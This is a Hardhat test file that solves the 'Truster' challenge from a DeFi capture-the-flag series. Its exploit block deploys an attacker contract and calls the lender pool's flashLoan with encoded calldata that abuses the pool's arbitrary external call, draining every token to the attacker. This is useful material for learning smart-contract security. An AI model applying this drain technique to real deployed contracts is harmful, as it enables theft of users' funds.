const { ethers } = require('hardhat');
const { expect } = require('chai');
var Web3 = require('web3');
var web3 = new Web3(Web3.givenProvider || 'ws://some.local-or-remote.node:8546');
describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const TrusterAttacker = await ethers.getContractFactory('TrusterAttacker', attacker);
        this.trusterAttacker = await TrusterAttacker.deploy()
        console.log(`Attacker address ${this.trusterAttacker.address}`)
        await this.pool.flashLoan(TOKENS_IN_POOL, this.trusterAttacker.address, this.trusterAttacker.address, 
          web3.eth.abi.encodeFunctionCall({
                name: 'exploit',
                type: 'function',
                inputs: [{
                    type: 'address',
                    name: 'token'
                },{
                    type: 'uint256',
                    name: 'amount'
                },{
                    type: 'address',
                    name: 'attacker'
                }]
            }, [await this.token.address,  TOKENS_IN_POOL, attacker.address]));

        // await this.token.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL, {from : attacker})
   
    });

    after(async function () {

        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

